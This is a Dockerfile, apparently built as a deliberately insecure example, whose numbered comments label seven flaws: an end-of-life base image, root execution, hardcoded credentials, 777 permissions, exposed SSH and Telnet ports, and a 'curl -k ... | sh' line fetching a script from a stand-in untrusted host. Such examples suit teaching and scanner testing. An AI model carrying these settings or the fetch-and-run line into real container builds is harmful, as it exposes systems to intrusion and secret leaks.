# 1. USING AN ANCIENT, UNSUPPORTED BASE IMAGE
# Using an old version of Debian (Jessie) ensures hundreds of known CVEs
FROM debian:jessie

# 2. RUNNING AS ROOT (Default)
# We aren't defining a USER, so the app runs with full root privileges.

# 3. INSTALLING UNNECESSARY & VULNERABLE PACKAGES
# Installing SSH and Telnet provides extra attack vectors for remote access.
RUN apt-get update && apt-get install -y \
    openssh-server \
    telnet \
    curl \
    wget \
    gcc \
    make

# 4. HARDCODING SENSITIVE CREDENTIALS
ENV DB_PASSWORD="SuperSecretPassword123"
ENV API_KEY="sk_live_51MzX..."

# 5. INSECURE PERMISSIONS
# Giving 777 permissions to the entire app directory
COPY ./my-app /app
RUN chmod -R 777 /app

# 6. DISABLING SECURITY FEATURES
# Let's say we are downloading a binary and bypassing checksums/SSL
RUN curl -k http://untrusted-source.com/malicious-script.sh | sh

# 7. OPENING DANGEROUS PORTS
# Opening SSH (22) and Telnet (23) alongside the web app
EXPOSE 22 23 8080

WORKDIR /app
CMD ["python", "app.py"]
